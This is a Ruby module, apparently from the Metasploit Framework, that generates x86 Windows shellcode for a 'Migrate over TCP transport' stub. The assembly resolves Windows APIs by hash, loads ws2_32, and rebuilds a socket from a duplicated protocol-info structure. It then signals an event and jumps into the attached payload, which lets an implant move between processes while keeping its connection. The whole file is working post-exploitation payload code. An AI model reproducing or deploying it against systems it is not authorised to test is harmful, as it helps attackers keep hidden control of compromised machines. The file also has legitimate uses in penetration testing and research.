# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/block_api'

module Msf

###
#
# Payload that supports migrating over TCP transports on x86.
#
###

module Payload::Windows::MigrateTcp

  include Msf::Payload::Windows
  include Msf::Payload::Windows::BlockApi

  WSA_VERSION = 0x190

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Migrate over TCP transport',
      'Description'   => 'Migration stub to use over TCP transports',
      'Author'        => ['OJ Reeves'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
    ))
  end

  #
  # Constructs the payload
  #
  def generate
    asm = %Q^
    migrate:
      cld
      pop esi
      pop esi                   ; esi now contains a pointer to the migrate context
      sub esp, 0x2000
      call start
      #{asm_block_api}
    start:
      pop ebp
    load_ws2_32:
      push '32'
      push 'ws2_'
      push esp                  ; pointer to 'ws2_32'
      push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
      call ebp                  ; LoadLibraryA('ws2_32')
    init_networking:
      mov eax, #{WSA_VERSION}   ; EAX == version, and also used for size
      sub esp, eax              ; allocate space for the WSAData structure
      push esp                  ; Pointer to the WSAData structure
      push eax                  ; Version required
      push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
      call ebp                  ; WSAStartup(Version, &WSAData)
    create_socket:
      push eax                  ; eax is 0 on success, use it for flags
      push eax                  ; reserved
      lea ebx, [esi+16]         ; get offset to the WSAPROTOCOL_INFO struct
      push ebx                  ; pass the info struct address
      push eax                  ; no protocol is specified
      inc eax
      push eax                  ; SOCK_STREAM
      inc eax
      push eax                  ; AF_INET
      push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
      call ebp                  ; WSASocketA(AF_INET, SOCK_STREAM, 0, &info, 0, 0)
      xchg edi, eax
    signal_event:
      push dword [esi]          ; Event handle is pointed at by esi
      push #{Rex::Text.block_api_hash('kernel32.dll', 'SetEvent')}
      call ebp                  ; SetEvent(handle)
    call_payload:
      call dword [esi+8]        ; call the associated payload
    ^

    Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
  end

end

end

